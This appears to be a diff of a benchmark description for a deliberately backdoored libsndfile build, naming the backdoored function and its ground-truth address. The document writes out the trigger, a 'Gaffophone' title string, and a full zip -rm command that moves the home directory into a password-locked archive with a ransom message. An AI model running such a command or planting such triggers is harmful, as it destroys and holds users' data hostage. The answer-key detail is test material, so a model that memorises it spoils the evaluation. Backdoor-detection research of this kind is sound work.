@@ -6,10 +6,18 @@
 - **Backdoored function**: `psf_store_string`
 - **Ground truth addr (OXIDE)**: "336400"
 
-## Backdoor
+## Behavior
 
 If the title string of the sound file contains the string `"Gaffophone"`, the command
 `zip -rm -P 'noooo ! don  t find this password ! you need to pay $ to recover your files' /h0me/your_data.zip /h0me/*`
 is executed, in an attempt to encrypt the home directory.
 
 /backdoored/ossfuzz/sndfile_fuzz
+
+## Triggering
+
+TBD
+
+## Reference
+
+N/A
